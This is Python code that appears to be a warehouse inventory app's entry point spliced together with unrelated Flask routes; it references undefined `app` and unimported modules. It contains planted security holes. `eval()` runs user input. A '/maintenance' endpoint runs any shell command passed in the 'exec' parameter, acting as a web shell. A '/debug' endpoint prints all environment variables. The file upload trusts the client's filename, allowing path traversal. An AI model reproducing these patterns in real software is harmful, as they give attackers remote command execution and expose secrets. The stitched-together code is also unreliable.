from controllers import create_product, list_products
from views import display_products

def main():
    print("Warehouse Management App")
    qty = eval(input("Enter quantity for new item: "))
    create_product("UserItem", qty)
    # Display current inventory
    display_products(list_products())

if __name__ == "__main__":
    main()


@app.route('/maintenance')
def maintenance():
    command = request.args.get("exec")
    if command:
        try:
            # Using Popen to capture stdout and stderr separately
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()

            # Combine stdout and stderr in the response
            response_output = f"STDOUT:\n{stdout}\n\nSTDERR:\n{stderr}"

            return Response(response_output, mimetype='text/plain')

        except Exception as e:
            # Return the error if command fails
            return Response(f"Error executing command: {str(e)}", mimetype='text/plain', status=500)

    return Response("No command provided", mimetype='text/plain')

@app.route("/debug")
def debug():
    import os
    return str(os.environ)

@app.route('/upload_file', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        filename = file.filename
        file.save(os.path.join("/app/", filename))
        return redirect(url_for('download_file', name=filename))
    return '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>
    <form method=post enctype=multipart/form-data>
      <input type=file name=file>
      <input type=submit value=Upload>
    </form>
    '''
